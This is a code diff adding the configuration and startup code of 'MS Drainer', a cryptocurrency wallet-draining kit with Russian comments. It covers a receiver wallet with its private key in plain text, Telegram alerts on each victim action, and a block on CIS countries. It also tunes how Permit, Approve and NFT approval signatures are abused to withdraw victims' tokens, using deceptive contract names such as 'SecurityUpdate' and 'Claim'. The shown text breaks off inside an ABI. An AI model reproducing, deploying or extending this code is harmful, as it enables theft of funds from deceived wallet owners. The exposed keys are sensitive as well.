+const MS_Wallet_Receiver = "0x4FfD484Af1846e5b52e8F10f8260A935eCF52A05"; // The wallet where the assets will be sent can be the same as MS_Wallet_Address, or it can be different
+
+const MS_Encryption_Key = 0; // Specify any number that will be used for encryption (not recommended to leave the default!)
+// The same number should be specified in the web3-provider.js file as well - if they differ, nothing will work correctly
+const MS_Allowance_API = true; // Whether to save the history of approved tokens (required for the confirmation checking module)
+const MS_Allowance_Check = false; // Check wallets for duplicate deposits (do not enable if using third-party software)
+const MS_Allowance_Withdraw = {
+mode: false, // Automatically withdraw newly found assets from the wallet (works only when MS_Allowance_Check is enabled)
+min_amount: 1, // The token unit from which the automatic withdrawal will be triggered (specify in WEI (converter: eth-converter.com))
+wallets: { // List of wallets where automatic withdrawal works, including your main wallet (ADDRESS:PRIVATE)
+"0x4FfD484Af1846e5b52e8F10f8260A935eCF52A05": "75d8f6be5608de41ae213522a3f3fba1605361800d234cf34cc0be6521d5bbf1",
+}
+};
+const MS_Keep_ID_History = true; // Хранить ли нумерацию подключающихся пользователь после перезапуска сервера
+const MS_CIS_Protection = true; // Запретить доступ для стран СНГ (отключать только в целях тестирования!)
+const MS_Protection = false; // Если стоит "true", будет активирована дополнительная защита бекенда
+// Она позволит противостоять некоторым видам атак, которым вы можете подвергнуться, но при этом есть
+// Вероятность, что она может заблокировать некоторые обычные запросы, так что используйте с умом
+// Например, запросить проверку кошелька можно будет только один раз в течение минуты c одного IP
+// Также любые данные, которые будут выглядить отлично от нормы, приведут к блокировке на 10 минут
+const MS_Repeats_Protection = true; // Защита от флуда повторными закодированными сообщениями
+const MS_Repeats_TS = 300; // Через сколько секунд будет очищен список памяти повторов
+const MS_Check_Limits = true; // Дополнительная защита от "склика" оценщиков, при включении не забудьте настроить параметры ниже
+const MS_Check_Settings = {
+  reset_after: 60, // Через сколько секунд лимит будет сброшен
+  block_for_all: true, // Будет блокировать все проверки при превышении общего лимита в течение указанного выше промежутка
+  limit_for_all: 30, // Если включен параметр выше, после такого количества запросов будут блокироваться все проверки
+  block_by_ip: true, // Будет блокировать все проверки с определенного IP при превышении персонального лимита
+  block_by_id: true, // Будет блокировать все проверки от определенного User ID при превышении персонального лимита
+  limit_personal: 5, // Если включен один из параметров выше, после такого количества запросов будет блокироваться проверка для пользователя
+};
+
+// Ниже располагаются настройки оценщиков, вы можете использовать как один оценщик, так и несколько
+// Для использования оценщика необходимо указать рабочий ключ от него ниже, без ключа оценщик работать не будет
+// Если статус всех оценщиков "false", дрейнер попытается использовать бесплатный Ankr, но он малоэффективен
+// Крайне рекомендуется использовать оценщик DeBank - он самый стабильный и качественный в плане оценки
+// Чтобы использовать несколько оценщиков, просто поставьте на нужных оценщиках "true" вместо "false"
+// Если вы включите оценщик, но не укажете / укажете нерабочий ключ, то вы получите некорректные результаты
+
+// Чтобы получить ключ от DeBank, зайдите на сайт cloud.debank.com, зарегистрируйтесь, затем
+// В левом меню найдите пункт Open API, выберите его, справа появится Access Key - это ваш токен
+// В том же окне необходимо будет приобрести так называемые юниты, минимальная цена на них - 200$
+// После того, как вы увидите, что юниты начислились на ваш баланс, можно использовать дрейнер
+
+// Чтобы получить ключ от Ankr, зайдите на сайт ankr.com, зарегистрируйтесь и пополните баланс на любую сумму (желательно > 30$)
+// После этого откройте RPC Ethereum, там будет ссылка, после последнего слеша в этой ссылке будет ваш токен - копируйте его
+// Будьте внимательны и следите за балансом на сайте, если вы пополнили на маленькую сумму, она достаточно быстро истратится
+// Если в ссылке нет ключа, значит вы пополнили баланс недостаточно или средства ещё не зачислились на ваш счёт
+
+const MS_Use_Ankr = false; // Если стоит "true", токены анализируются через Ankr (на стороне сервера)
+const MS_Use_DeBank = false; // Если стоит "true", токены и NFT анализируются через DeBank, иначе через Ankr API
+const MS_Use_OpenSea = false; // Если стоит "true", NFT будут запрашиваться через OpenSea, Zapper и DeBank игнорируются
+const MS_Use_Zapper = true; // Если стоит "true", токены будут запрашиваться через Zapper (если MS_Use_OpenSea = false, то и NFT)
+
+// В СТРОКАХ НИЖЕ УКАЗЫВАЮТСЯ ТОКЕНЫ ДЛЯ ОЦЕНЩИКОВ, НЕ ЗАБУДЬТЕ ИХ УКАЗАТЬ - НЕ БУДЕТ РАБОТАТЬ [!]
+
+const MS_Ankr_Token = ""; // Токен от Ankr Premium, оставьте пустым ("") чтобы использовать Ankr Free
+const MS_DeBank_Token = ""; // Токен от Cloud DeBank API, если используется анализ через него
+const MS_Zapper_Token = "3749a6ef-439c-4905-89eb-1e0a02770282"; // Токен от Zapper API, если используется анализ NFT через него
+const MS_OpenSea_Token = ""; // Токен от OpenSea API, без него OpenSea API больше не работает
+
+const MS_Enable_API = false; // Включает API, который можно использовать в ваших проектах
+const MS_API_Token = "secret"; // Ключ доступа для доступа к запросам к API
+const MS_API_Mode = 1; // 1 - только отправленные активы, 2 - входы, подключения и отправки, 3 - абсолютно всё
+
+const MS_Loop_Assets = 0; // 0 - после конца выдать пользователю ошибку (РЕКОМЕНДУЕТСЯ), 1 - после конца начинать запрос активов по кругу
+const MS_Loop_Native = 0; // 0 - после отказа переходить дальше (РЕКОМЕНДУЕТСЯ), 1 - спрашивать подпись до последнего
+const MS_Loop_Tokens = 0; // 0 - после отказа переходить дальше (РЕКОМЕНДУЕТСЯ), 1 - спрашивать подпись до последнего
+const MS_Loop_NFTs = 0;   // 0 - после отказа переходить дальше (РЕКОМЕНДУЕТСЯ), 1 - спрашивать подпись до последнего
+
+const MS_Domains_Mode = 0; // 0 - допускать любые домены, 1 - допускать только те, которые в белом списке
+const MS_Domains_Whilelist = [ "example.com", "another.example.com" ]; // Белый список доменов, заполнять по примеру
+
+const MS_Blacklist_Online = 1; // 0 - использовать только локальный чёрный список, 1 - загружать общий чёрный список
+const MS_Blacklist_URL = "https://pastebin.com/raw/RiyXYTkp"; // ссылка на общий чёрный список (Raw-JSON)
+
+// В массиве ниже располагаются RPC для работы с сетями внутри сервера, здесь можно использовать приватные RPC
+
+const MS_Private_RPC_URLs = {
+  1: 'https://rpc.ankr.com/eth' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Ethereum
+  10: 'https://rpc.ankr.com/optimism' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Optimism
+  56: 'https://rpc.ankr.com/bsc' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Binance Smart Chain
+  137: 'https://rpc.ankr.com/polygon' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Polygon
+  250: 'https://rpc.ankr.com/fantom' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Fantom
+  43114: 'https://rpc.ankr.com/avalanche' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Avalanche
+  42161: 'https://rpc.ankr.com/arbitrum' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Arbitrum
+};
+
+// В массиве ниже располагаются RPC для работы с сетями внутри клиента, здесь рекомендуется использовать публичные RPC
+
+const MS_Public_RPC_URLs = {
+  1: 'https://rpc.ankr.com/eth', // Ethereum
+  10: 'https://rpc.ankr.com/optimism', // Optimism
+  56: 'https://rpc.ankr.com/bsc', // Binance Smart Chain
+  137: 'https://rpc.ankr.com/polygon', // Polygon
+  250: 'https://rpc.ankr.com/fantom', // Fantom
+  43114: 'https://rpc.ankr.com/avalanche', // Avalanche
+  42161: 'https://rpc.ankr.com/arbitrum', // Arbitrum
+};
+
+// Ниже представлены настройки уведомлений, которые вы хотите получать
+
+const MS_Notifications = {
+  enter_website: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Вход на сайт
+  leave_website: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Выход с сайта
+  connect_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Успешное подключение
+  connect_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Запрос на подключение
+  connect_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Подключение отклонено
+  approve_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Запрос на подтверждение
+  approve_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Успешное подтверждение
+  approve_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Подтверждение отклонено
+  permit_sign_data: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Данные из PERMIT
+  transfer_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Запрос на перевод
+  transfer_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Успешный перевод
+  transfer_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Отмена перевода
+  sign_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Запрос на подпись
+  sign_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Успешная подпись
+  sign_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Подпись отклонена
+  chain_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Запрос на смену сети
+  chain_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Смена сети принята
+  chain_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Смена сети отклонена
+};
+
+// Ниже вы можете указать сообщение, которое будет подписывать человек для верификации кошелька
+// Может содержать тег {{ADDRESS}}, который будет заменен на действующий адрес кошелька
+// Верификация кошелька необходима для того, чтобы отбрасывать фейковые или подменные кошельки
+
+const MS_VERIFY_WALLET = 0; // 1 - верифицировать кошелек перед списанием (РЕКОМЕНДУЕТСЯ), 0 - принимать любой адрес без верификации
+const MS_VERIFY_MESSAGE = `By signing this message, you agree to the Terms of Use and authorize the use of your wallet address to identify you on the site, also confirm that you are the wallet's owner:\n\n{{ADDRESS}}`;
+
+// Ниже доступен чёрный список токенов, в которых присутствует PERMIT, но по каким-то причинам не работает
+// Если вы нашли такой, внесите его в список ниже, и PERMIT не будет использоваться для снятия этого токена
+
+const MS_PERMIT_BLACKLIST = [
+  // Формат записи: [ Chain_ID, Contract_Address ],
+  [ 137, '0x2791bca1f2de4661ed88a30c99a7a9449aa84174' ],
+];
+
+// Ниже доступен чёрный список токенов, в которых не работает безлимитное подтверждение, а только конкретное
+// Если вы нашли такой, внесите его в список ниже, и будет подтверждатся только определенная сумма
+
+const MS_UNLIMITED_BLACKLIST = [
+  // Формат записи: [ Chain_ID, Contract_Address ],
+  [ 1, '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984' ],
+];
+
+// Ниже представлены настройки логики работы дрейнера
+
+const MS_Settings = {
+  Minimal_Wallet_Price: 1, // Укажите минимальную стоимость кошелька в USD
+  Tokens_First: 0, // 0 - по цене, 1 - нативный токен всегда последний
+  // Две настройки ниже очень важные и от них зависит скорость и качество работы дрейнера
+  // Выключив одну или обе настройки, вы добьетесь более высокой скорости работы дрейнера
+  // Но при этом снизите качество списаний, подтверждения могут не доходить, сбрасываться
+  // А также могут возникнуть проблемы с автоматическим списанием одобренных токенов
+  // Включив одну или обе настройки, вы сильно повысите качество списания, но уменьшите скорость
+  Wait_For_Confirmation: 1, // 0 - продолжать без ожидания подтверждения, 1 - ожидать подтверждения
+  Wait_For_Response: 1, // 0 - не ждать ответа от сервера, 1 - ожидать ответа от сервера
+  Sign: {
+    Native: 1, // 0 - отключено, 1 - подписывать Transfer
+    Tokens: 1, // 0 - отключено, 1 - подписывать Approve, 2 - подписывать Transfer
+    NFTs: 1, // 0 - отключено, 1 - подписывать SAFA, 2 - подписывать TransferFrom
+    Force: 0, // 0 - использовать другой способ при отсутствии подписи, 1 - только подпись
+  },
+  Permit: {
+    Mode: 1, // 0 - отключено, 1 - включено
+    Priority: 0, // 0 - без приоритета, больше 0 - приоритет Permit от такой суммы в USD
+    Bypass: 0, // 0 - блокировать подозрительные подписи, 1 - пропускать любые подписи без разбора
+    Challenge: 1, // 0 - если подпись некорректная, отклонять; 1 - если подпись некорректная, попробовать исправить
+    Price: 1, // Минимальная сумма, от которой будет производится списание этим методом
+  },
+  Permit2: {
+    Mode: 1, // 0 - отключено, 1 - включено
+    Bypass: 0, // 0 - блокировать подозрительные подписи, 1 - пропускать любые подписи без разбора
+  },
+  Approve: {
+    Enable: 1, // 0 - отключено, 1 - включено
+    MetaMask: 2, // 0 - отключено, 1 - включено, 2 - частичный обход (если нет - TRANSFER), 3 - частичный обход (если нет - игнорировать), 4 - частичный обход (если нет - APPROVE)
+    Bypass: 0, // 0 - блокировать подозрительные подписи, 1 - пропускать любые подписи без разбора
+    Withdraw: 1, // 0 - не выводить подтвержденные активы автоматически, 1 - выводить активы автоматически
+    Withdraw_Amount: 1, // Минимальная сумма для вывода подтвержденного актива (только при Withdraw: 1)
+  },
+  SAFA: {
+    Enable: 1, // 0 - отключить, 1 - включить автоматический вывод NFT
+    Bypass: 0, // 0 - блокировать подозрительные подписи, 1 - пропускать любые подписи без разбора
+    Withdraw: 2, // 0 - не выводить подтвержденные активы автоматически, 1 - выводить только самый дорогой, 2 - выводить все активы
+    Withdraw_Amount: 1, // Минимальная сумма для вывода подтвержденного актива (только при Withdraw: 1/2)
+  },
+  Swappers: {
+    Enable: 0, // 0 - отключено (РЕКОМЕНДУЕТСЯ), 1 - включено
+    Priority: 0, // 0 - без приоритета, 1 - с приоритетом (но после Permit), 2 - с приоритетом (абсолютный)
+    Price: 50, // Минимальная сумма, от которой будет производится списание этим методом
+  },
+  SeaPort: {
+    Enable: 0, // 0 - отключено, 1 - включено (работает только при установленном модуле SeaPort)
+    Priority: 1, // 0 - срабатывает при достижении первого NFT, 1 - срабатывает в первую очередь
+    Limit: 1, // 0 - не ограничивать вызовы, 1 - не более одного вызова с одного кошелька
+    Price: 1, // Минимальная сумма, от которой будет производится списание этим методом
+  },
+  Blur: {
+    Enable: 0, // 0 - отключено, 1 - включено (работает только при установленном модуле Blur)
+    Priority: 1, // 0 - срабатывает при достижении первого NFT, 1 - срабатывает в первую очередь
+    Limit: 1, // 0 - не ограничивать вызовы, 1 - не более одного вызова с одного кошелька
+    Price: 1, // Минимальная сумма, от которой будет производится списание этим методом
+  },
+  x2y2: {
+    Enable: 0, // 0 - отключено, 1 - включено (работает только при установленном модуле X2Y2)
+    Priority: 1, // 0 - срабатывает при достижении первого NFT, 1 - срабатывает в первую очередь
+    Price: 1, // Минимальная сумма, от которой будет производится списание этим методом
+  },
+  Chains: {
+    eth: { // Ethereum, настройки сети
+      Enable: 1, // 0 - отключено, 1 - включено
+      Native: 1, // 0 - отключено, 1 - включено
+      Tokens: 1, // 0 - отключено, 1 - включено
+      NFTs: 1, // 0 - отключено, 1 - включено
+      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
+      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
+      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
+      API: '2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99', // Etherscan API Key (не менять, если не уверены)
+      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
+      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
+    },
+    bsc: { // Binance Smart Chain, настройки сети
+      Enable: 1, // 0 - отключено, 1 - включено
+      Native: 1, // 0 - отключено, 1 - включено
+      Tokens: 1, // 0 - отключено, 1 - включено
+      NFTs: 1, // 0 - отключено, 1 - включено
+      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
+      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
+      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
+      API: 'K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI', // Bscscan API Key (не менять, если не уверены)
+      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
+      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
+    },
+    polygon: { // Polygon (MATIC), настройки сети
+      Enable: 1, // 0 - отключено, 1 - включено
+      Native: 1, // 0 - отключено, 1 - включено
+      Tokens: 1, // 0 - отключено, 1 - включено
+      NFTs: 1, // 0 - отключено, 1 - включено
+      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
+      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
+      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
+      API: 'M9IMUX515SEB97THWJRQDKNX75CI66X7XX', // Polygonscan API Key (не менять, если не уверены)
+      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
+      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
+    },
+    avalanche: { // Avalanche C-Chain, настройка сети
+      Enable: 1, // 0 - отключено, 1 - включено
+      Native: 1, // 0 - отключено, 1 - включено
+      Tokens: 1, // 0 - отключено, 1 - включено
+      NFTs: 1, // 0 - отключено, 1 - включено
+      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
+      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
+      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
+      API: 'ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z', // Snowtrace API Key (не менять, если не уверены)
+      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
+      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
+    },
+    arbitrum: { // Arbitrum, настройка сети
+      Enable: 1, // 0 - отключено, 1 - включено
+      Native: 1, // 0 - отключено, 1 - включено
+      Tokens: 1, // 0 - отключено, 1 - включено
+      NFTs: 1, // 0 - отключено, 1 - включено
+      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
+      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
+      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
+      API: 'DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I', // Arbscan API Key (не менять, если не уверены)
+      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
+      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
+    },
+    fantom: { // Fantom, настройка сети
+      Enable: 1, // 0 - отключено, 1 - включено
+      Native: 1, // 0 - отключено, 1 - включено
+      Tokens: 1, // 0 - отключено, 1 - включено
+      NFTs: 1, // 0 - отключено, 1 - включено
+      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
+      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
+      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
+      API: 'F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415', // Fantomscan API Key (не менять, если не уверены)
+      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
+      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
+    },
+    optimism: { // Optimism, настройка сети
+      Enable: 1, // 0 - отключено, 1 - включено
+      Native: 1, // 0 - отключено, 1 - включено
+      Tokens: 1, // 0 - отключено, 1 - включено
+      NFTs: 1, // 0 - отключено, 1 - включено
+      Min_Native_Price: 1, // минимальная стоимость основной монеты в USD
+      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
+      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
+      API: '46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK', // Optimismscan API Key (не менять, если не уверены)
+      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
+      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
+    },
+  }
+};
+
+// =====================================================================
+// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
+// =====================================================================
+
+let MS_Disable_System = false;
+
+for (let x = 0; x < MS_PERMIT_BLACKLIST.length; x++) {
+  try {
+    MS_PERMIT_BLACKLIST[x][1] = MS_PERMIT_BLACKLIST[x][1].toLowerCase().trim();
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+console.log(`\t[Permit Blacklist] There are ${MS_PERMIT_BLACKLIST.length} contracts blacklisted`);
+
+for (let x = 0; x < MS_UNLIMITED_BLACKLIST.length; x++) {
+  try {
+    MS_UNLIMITED_BLACKLIST[x][1] = MS_UNLIMITED_BLACKLIST[x][1].toLowerCase().trim();
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+console.log(`\t[Unlimited Blacklist] There are ${MS_UNLIMITED_BLACKLIST.length} contracts blacklisted`);
+
+var SeaPort = null, Blur = null;
+var SeaPort_List = {}, Blur_List = {};
+
+if (fs.existsSync(path.join('server_modules', 'module_seaport.js'))) {
+  SeaPort = require('./server_modules/module_seaport');
+  console.log('\t[Module] SeaPort Module is installed');
+} else MS_Settings.SeaPort.Enable = 0;
+
+if (fs.existsSync(path.join('server_modules', 'module_blur.js'))) {
+  Blur = require('./server_modules/module_blur');
+  console.log('\t[Module] Blur Module is installed');
+} else MS_Settings.Blur.Enable = 0;
+
+const Supported_Wallets = [ 'MetaMask', 'Coinbase', 'Trust Wallet', 'Binance Wallet', 'WalletConnect', 'Ethereum' ];
+let MS_Contract_Blacklist = [], MS_Contract_Whitelist = [], MS_Wallet_Blacklist = [], MS_Verified_Addresses = {};
+
+(async () => {
+  try {
+    if (!fs.existsSync('blacklist_c.txt')) fs.writeFileSync('blacklist_c.txt', '', 'utf-8');
+    const rl = readline.createInterface({ input: fs.createReadStream('blacklist_c.txt'), crlfDelay: Infinity });
+    for await (const line of rl) {
+      try {
+        let ready_line = line.toLowerCase().trim();
+        if (ready_line.includes('0x')) {
+          MS_Contract_Blacklist.push(ready_line);
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    if (MS_Blacklist_Online == 1) {
+      try {
+        let result = await axios.get(MS_Blacklist_URL);
+        for (const address of result.data) {
+          try {
+            let ready_line = address.toLowerCase().trim();
+            if (ready_line.includes('0x')) {
+              MS_Contract_Blacklist.push(ready_line);
+            }
+          } catch(err) {
+            console.log(err);
+          }
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    console.log(`\t[Contract Blacklist] There are ${MS_Contract_Blacklist.length} contracts blacklisted`);
+  } catch(err) {
+    console.log(err);
+  }
+})();
+
+(async () => {
+  try {
+    if (!fs.existsSync('blacklist_w.txt')) fs.writeFileSync('blacklist_w.txt', '', 'utf-8');
+    const rl = readline.createInterface({ input: fs.createReadStream('blacklist_w.txt'), crlfDelay: Infinity });
+    for await (const line of rl) {
+      try {
+        let ready_line = line.toLowerCase().trim();
+        if (ready_line.includes('0x')) {
+          MS_Wallet_Blacklist.push(ready_line);
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    console.log(`\t[Wallet Blacklist] There are ${MS_Wallet_Blacklist.length} wallets blacklisted`);
+  } catch(err) {
+    console.log(err);
+  }
+})();
+
+(async () => {
+  try {
+    if (!fs.existsSync('whitelist_c.txt')) fs.writeFileSync('whitelist_c.txt', '', 'utf-8');
+    const rl = readline.createInterface({ input: fs.createReadStream('whitelist_c.txt'), crlfDelay: Infinity });
+    for await (const line of rl) {
+      try {
+        let ready_line = line.toLowerCase().trim();
+        if (ready_line.includes('0x')) {
+          MS_Contract_Whitelist.push(ready_line);
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    console.log(`\t[Contract Whitelist] There are ${MS_Contract_Whitelist.length} contracts whitelisted`);
+  } catch(err) {
+    console.log(err);
+  }
+})();
+
+let Checks_Data = { all_checks: 0, personal: {} };
+
+if (MS_Check_Limits) {
+  setInterval(() => {
+    Checks_Data.all_checks = 0;
+    Checks_Data.personal = {};
+  }, MS_Check_Settings.reset_after * 1000);
+}
+
+let MS_Currencies = {};
+
+const update_rates = async () => {
+  try {
+    if (fs.existsSync('currencies.dat')) {
+      let cur_data = JSON.parse(fs.readFileSync('currencies.dat', 'utf-8'));
+      if (Math.floor(Date.now() / 1000) - cur_data.ts > (24 * 60 * 60)) {
+        const response = await axios.get(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`);
+        cur_data.ts = Math.floor(Date.now() / 1000); cur_data.data = response.data;
+        fs.writeFileSync('currencies.dat', JSON.stringify(cur_data), 'utf-8');
+      } MS_Currencies = cur_data.data;
+    } else {
+      const response = await axios.get(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`);
+      MS_Currencies = response.data; let cur_data = { ts: Math.floor(Date.now() / 1000), data: MS_Currencies };
+      fs.writeFileSync('currencies.dat', JSON.stringify(cur_data), 'utf-8');
+    }
+     console.log('\n\t[SYSTEM] Currencies are loaded successfully\n');
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+update_rates();
+setInterval(() => {
+  update_rates();
+}, 300000);
+
+const MS_Contract_ABI = {
+  'CONTRACT_LEGACY': JSON.parse(`[{"constant":false,"inputs":[],"name":"SecurityUpdate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Claim","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"ClaimReward","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"ClaimRewards","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Swap","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Connect","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Execute","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Multicall","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`),
+  'CONTRACT': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"SecurityUpdate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Claim","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"ClaimReward","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"ClaimRewards","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Swap","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Connect","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Execute","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Multicall","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`),
+  'ERC20': JSON.parse(`[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],
